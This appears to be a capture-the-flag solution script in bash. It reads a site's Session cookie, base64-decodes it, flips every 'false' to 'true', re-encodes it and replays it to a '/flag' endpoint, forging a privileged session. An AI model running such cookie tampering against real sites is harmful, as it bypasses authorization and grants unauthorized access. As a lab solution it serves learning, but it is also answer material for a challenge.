#!/usr/bin/env bash

base_url=$1

cookie=$(curl -s -v "${base_url}/" 2>&1 | grep "set-cookie:" | sed -E "s/^.*Session=([^;]+).*$/\1/g")

echo "$cookie"

transformed=$(echo -n "${cookie}" | base64 -d -w0 | sed 's/ //g' | sed 's/false/true/g' | base64 -w0 )

echo "$transformed"

curl -sv "${base_url}/flag" -H "cookie: Session=\"$(echo "${transformed}")\""
